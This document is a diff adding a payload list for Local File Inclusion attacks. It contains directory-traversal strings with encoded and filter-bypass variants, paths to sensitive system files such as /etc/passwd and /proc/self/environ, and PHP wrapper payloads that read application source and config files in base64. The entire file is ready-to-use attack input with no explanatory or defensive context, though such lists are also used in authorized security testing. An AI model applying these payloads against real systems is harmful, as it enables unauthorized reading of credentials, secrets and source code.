@@ -1,0 +1,22 @@
+# Local File Inclusion Payloads
+
+# Unix Files
+/etc/passwd
+/etc/hosts
+/proc/self/environ
+/proc/self/cmdline
+/etc/issue
+
+# Windows Files
+C:\Windows\win.ini
+C:\Windows\System32\drivers\etc\hosts
+
+# Directory Traversal Bypasses
+../../../../etc/passwd
+....//....//....//....//etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+
+# PHP Wrappers
+php://filter/convert.base64-encode/resource=index.php
+php://input
+php://filter/read=convert.base64-encode/resource=config
